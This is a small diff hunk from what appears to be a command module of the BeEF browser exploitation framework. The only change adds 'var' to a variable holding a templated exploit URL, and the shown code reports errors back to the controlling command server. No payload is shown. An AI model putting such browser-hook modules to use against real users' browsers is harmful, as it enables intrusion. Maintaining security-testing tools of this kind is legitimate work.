@@ -5,7 +5,7 @@
 //
 
 beef.execute(function() {
-	url = '<%= @sploit_url %>';
+	var url = '<%= @sploit_url %>';
 	if (!/https?:\/\//i.test(url)) {
 		beef.net.send("<%= @command_url %>", <%= @command_id %>, "error=invalid url");
 		return;
